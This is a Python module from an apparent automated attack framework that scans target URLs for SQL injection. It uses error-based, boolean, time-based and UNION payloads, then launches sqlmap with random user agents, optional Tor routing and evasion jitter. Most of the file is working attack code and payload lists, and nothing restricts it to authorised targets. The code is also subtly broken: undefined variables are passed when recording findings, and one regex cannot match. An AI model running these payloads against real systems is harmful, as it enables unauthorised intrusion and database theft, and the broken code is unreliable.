#!/usr/bin/env python3
# modules/step08_sqli.py — SQLi Engine V7 (UPGRADED)
# Added: Python-native blind SQLi (boolean + time-based), error-based, OOB
# Source: CEH Ch14 + Bug Bounty Bootcamp Ch9 — full SQLi methodology
# Runs BEFORE sqlmap to catch fast wins + feeds confirmed URLs to sqlmap
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, re, time, urllib.request, urllib.parse, urllib.error, threading
from core.utils import FormatFixer, count_lines, safe_read

# ── Error-based signatures (CEH Ch14 + Bug Bounty Bootcamp) ──────────────────
ERROR_PATTERNS = [
    # MySQL
    (re.compile(r"you have an error in your sql syntax", re.I),          "critical","MySQL_ERROR_BASED"),
    (re.compile(r"warning: mysql_",                                re.I), "critical","MySQL_WARNING"),
    (re.compile(r"unclosed quotation mark after",                  re.I), "high",    "MSSQL_ERROR"),
    (re.compile(r"quoted string not properly terminated",          re.I), "high",    "Oracle_ERROR"),
    (re.compile(r"pg_query\(\).*error",                            re.I), "high",    "PostgreSQL_ERROR"),
    (re.compile(r"ora-\d{4,5}",                                    re.I), "critical","Oracle_ORA"),
    (re.compile(r"sqlite_exception\|sqlite error",                 re.I), "high",    "SQLite_ERROR"),
    (re.compile(r"microsoft.*odbc.*driver.*error",                 re.I), "high",    "MSSQL_ODBC"),
    (re.compile(r"supplied argument is not a valid mysql",         re.I), "high",    "MySQL_ARG"),
    (re.compile(r"com\.mysql\.jdbc\.exceptions",                   re.I), "high",    "MySQL_JDBC"),
    (re.compile(r"org\.hibernate\.exception",                      re.I), "medium",  "Hibernate_ERROR"),
    (re.compile(r"sqlstate\[",                                     re.I), "high",    "Generic_SQLSTATE"),
    (re.compile(r"sql syntax.*mariadb",                            re.I), "critical","MariaDB_ERROR"),
    (re.compile(r"unknown column '.*' in 'field list'",            re.I), "critical","MySQL_COLUMN"),
]

# ── Boolean-based payloads (Bug Bounty Bootcamp Ch9) ─────────────────────────
BOOLEAN_TESTS = [
    ("'",                      "' AND '1'='1",    "' AND '1'='2"),   # String quote
    ('"',                      '" AND "1"="1',    '" AND "1"="2'),   # Double quote
    ("1",                      "1 AND 1=1",       "1 AND 1=2"),      # Numeric
    ("1",                      "1 OR 1=1",        "1 OR 1=2"),       # OR-based
    ("1",                      "1' OR '1'='1",    "1' OR '1'='2"),   # Mixed
]

# ── Time-based payloads (CEH: blind SQLi confirmation) ───────────────────────
TIME_PAYLOADS = [
    ("MySQL",      "' AND SLEEP(5)-- -",           5.0),
    ("MySQL",      "1 AND SLEEP(5)-- -",           5.0),
    ("MSSQL",      "'; WAITFOR DELAY '0:0:5'-- -", 5.0),
    ("PostgreSQL",  "'; SELECT pg_sleep(5)-- -",    5.0),
    ("Oracle",     "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", 5.0),
    ("SQLite",     "' AND RANDOMBLOB(100000000)-- -", 3.0),
    ("MySQL",      "1; SELECT SLEEP(5)-- -",       5.0),
]

# ── Union-based detection (Bug Bounty Bootcamp) ───────────────────────────────
UNION_PROBES = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "1 UNION SELECT NULL-- -",
    "1 UNION SELECT @@version-- -",
    "' UNION SELECT @@version,NULL-- -",
    "' UNION ALL SELECT NULL-- -",
    "' UNION SELECT 1,2,3-- -",
]

# DB version extraction (confirms DB type + readable output)
VERSION_PAYLOADS = {
    "MySQL":      "' UNION SELECT @@version,NULL-- -",
    "MSSQL":      "' UNION SELECT @@version,NULL-- -",
    "PostgreSQL":  "' UNION SELECT version(),NULL-- -",
    "Oracle":     "' UNION SELECT banner,NULL FROM v$version-- -",
}

# SQLi-prone param names
SQLI_PARAMS = {
    "id","uid","user_id","userId","item","product_id","productId","cat","category",
    "cat_id","order","order_id","orderId","item_id","itemId","pid","cid","tid",
    "page","pg","p","num","no","record","row","col","column","field","edit",
    "view","sort","by","dir","asc","desc","search","q","query","keyword","term",
    "s","name","user","username","login","email","key","token","ref","code",
    "type","mode","action","method","lang","locale","year","month","day",
}


class SQLiStep:
    def __init__(self, p):
        self.p   = p
        self.log = p.log
        self.f   = p.files
        self._lock = threading.Lock()

    def run(self):
        urls       = self.f["urls"]
        sqli_params = self.f["sqli_params"]
        sqli_outdir = os.path.join(self.p.out, f"{self.p.prefix}_sqlmap")
        results_out = self.f["sqli_results"]
        found       = 0

        # Step 1: Build target list
        self.p.shell(
            f"cat {urls} | gf sqli > {sqli_params} 2>/dev/null", label="gf sqli")
        if count_lines(sqli_params) == 0:
            self._extract_sqli_params(urls, sqli_params)
        if count_lines(sqli_params) == 0:
            self.log.warn("SQLi: no params found"); return

        n = count_lines(sqli_params)
        self.log.info(f"SQLi V7: {n} candidates — error + boolean + time-based + sqlmap")

        # Step 2: Python-native fast detection (runs in parallel to sqlmap)
        targets = safe_read(sqli_params)[:100]

        fast_confirmed = []
        for url in targets:
            result = self._fast_detect(url)
            if result:
                sev, vtype, detail, vuln_url = result
                with open(results_out,"a") as f:
                    f.write(f"{vtype}: {vuln_url} | {detail}\n")
                self.p.add_finding(sev, vtype, vuln_url, detail,
                                   "sqli-fast-engine", response=response, payload=payload)
                fast_confirmed.append(vuln_url)
                found += 1
            self.p.bypass.jitter()

        # Step 3: sqlmap deep scan (on unconfirmed targets)
        cookie_flag = (f"--cookie '{self.p.args.cookie}'"
                       if getattr(self.p.args,"cookie",None) else "")
        self.p.shell(
            f"sqlmap -m {sqli_params} --batch --random-agent "
            f"--level=2 --risk=2 --output-dir={sqli_outdir} --forms "
            f"{cookie_flag} --no-logging 2>/dev/null",
            label="sqlmap deep", use_tor=bool(self.p.tor), timeout=1200
        )
        found += self._parse_sqlmap(sqli_outdir, results_out)

        self.log.success(f"SQLi V7: {found} confirmed findings")

    # ── Fast detection engine ─────────────────────────────────────────────────
    def _fast_detect(self, url: str):
        """
        3-phase SQLi detection:
        1. Error-based (fastest, most accurate)
        2. Boolean-based (medium speed, low FP)
        3. Time-based (slowest, last resort)
        """
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return None
        if not qs: return None

        for param in list(qs.keys())[:4]:
            orig_val = qs[param][0] if qs[param] else "1"

            # Phase 1: Error-based
            result = self._test_error_based(url, parsed, qs, param, orig_val)
            if result: return result

            # Phase 2: Boolean-based
            result = self._test_boolean(url, parsed, qs, param, orig_val)
            if result: return result

            # Phase 3: Time-based (only on high-value params)
            if param.lower() in SQLI_PARAMS:
                result = self._test_time_based(url, parsed, qs, param, orig_val)
                if result: return result

        return None

    def _test_error_based(self, url, parsed, qs, param, orig_val):
        """Bug Bounty Bootcamp: error messages = instant SQLi confirmation."""
        PROBES = ["'", '"', "\\", "';", '";', "` `", "' --", "\" --"]
        baseline = self._fetch(url)
        baseline_body = baseline.get("body","") if baseline else ""

        for probe in PROBES:
            test_url = self._inject(parsed, qs, param, orig_val + probe)
            resp = self._fetch(test_url)
            if not resp: continue
            body = resp.get("body","")
            if body == baseline_body: continue

            for pattern, sev, vtype in ERROR_PATTERNS:
                if pattern.search(body) and not pattern.search(baseline_body):
                    detail = (f"Error-based SQLi: param={param} probe='{probe}' "
                              f"triggered {vtype}")
                    return (sev, vtype, detail, test_url)
        return None

    def _test_boolean(self, url, parsed, qs, param, orig_val):
        """Boolean-based: compare true vs false response (Bug Bounty Bootcamp Ch9)."""
        baseline = self._fetch(url)
        if not baseline: return None
        baseline_len = len(baseline.get("body",""))

        for _, true_pl, false_pl in BOOLEAN_TESTS:
            true_url  = self._inject(parsed, qs, param, orig_val + true_pl)
            false_url = self._inject(parsed, qs, param, orig_val + false_pl)

            true_resp  = self._fetch(true_url)
            false_resp = self._fetch(false_url)
            if not true_resp or not false_resp: continue

            true_len  = len(true_resp.get("body",""))
            false_len = len(false_resp.get("body",""))
            true_st   = true_resp.get("status",0)
            false_st  = false_resp.get("status",0)

            # Key: true condition ≈ baseline, false condition differs
            baseline_similar = abs(true_len - baseline_len) < 50
            conditions_differ = (
                abs(true_len - false_len) > 100 or
                true_st != false_st
            )

            if baseline_similar and conditions_differ:
                detail = (f"Boolean SQLi: param={param} true_len={true_len} "
                          f"false_len={false_len} — response differs on condition")
                return ("high","SQLI_BOOLEAN",detail,true_url)
        return None

    def _test_time_based(self, url, parsed, qs, param, orig_val):
        """Time-based blind: measure delay (CEH methodology — last resort)."""
        # Baseline timing
        t0 = time.time()
        self._fetch(url)
        baseline_time = time.time() - t0

        for db_type, payload, expected_delay in TIME_PAYLOADS:
            test_url = self._inject(parsed, qs, param, orig_val + payload)
            t1 = time.time()
            self._fetch(test_url, timeout=expected_delay + 5)
            elapsed = time.time() - t1

            # Confirmed if response took expected_delay longer than baseline
            if elapsed >= (expected_delay * 0.8) and elapsed > baseline_time + 3:
                detail = (f"Time-based blind SQLi ({db_type}): param={param} "
                          f"delay={elapsed:.1f}s vs baseline={baseline_time:.1f}s "
                          f"payload='{payload[:40]}'")
                return ("critical","SQLI_TIMEBASED",detail,test_url)
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _inject(self, parsed, qs, param, value) -> str:
        test_qs = {k: list(v) for k,v in qs.items()}
        test_qs[param] = [value]
        return urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))

    def _fetch(self, url: str, timeout: int = 10) -> dict:
        try:
            req  = urllib.request.Request(url, headers={
                "User-Agent": self.p.bypass.ua(),
                "Accept":     "*/*",
            })
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status, "body": resp.read(80000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(5000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None

    def _extract_sqli_params(self, urls_file, out_file):
        if not os.path.isfile(urls_file): return
        added = set()
        with open(urls_file) as f:
            lines = [l.strip() for l in f if l.strip()]
        with open(out_file,"w") as out:
            for url in lines[:2000]:
                if "?" not in url: continue
                try:
                    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                    for k,v in qs.items():
                        val = v[0] if v else ""
                        if (k.lower() in SQLI_PARAMS or val.isdigit()) and url not in added:
                            out.write(url+"\n"); added.add(url); break
                except: pass

    def _parse_sqlmap(self, sqlmap_dir, results_out) -> int:
        if not os.path.isdir(sqlmap_dir): return 0
        confirmed = 0
        for root, dirs, files in os.walk(sqlmap_dir):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath,"r",errors="ignore") as f: content = f.read()
                    if any([
                        "sqlmap identified the following injection point" in content,
                        "is vulnerable" in content.lower() and "Parameter:" in content,
                        "[CRITICAL] Parameter:" in content and "injectable" in content.lower(),
                    ]):
                        url_m   = re.search(r'URL:\s+(\S+)', content)
                        param_m = re.search(r'Parameter:\s+(.+?)(?:\n|$)', content)
                        type_m  = re.search(r'Type:\s+(.+?)(?:\n|$)', content)
                        tgt = url_m.group(1) if url_m else os.path.basename(root)
                        par = param_m.group(1).strip() if param_m else "unknown"
                        typ = type_m.group(1).strip()  if type_m  else "unknown"
                        detail = f"param={par} type={typ}"
                        with open(results_out,"a") as out:
                            out.write(f"SQLI_SQLMAP: {tgt} | {detail}\n")
                        sev = "critical" if "blind" not in typ.lower() else "high"
                        self.p.add_finding(sev,"SQLI_SQLMAP",tgt,detail,"sqlmap", response=response, payload=payload)
                        confirmed += 1
                except: pass
        return confirmed
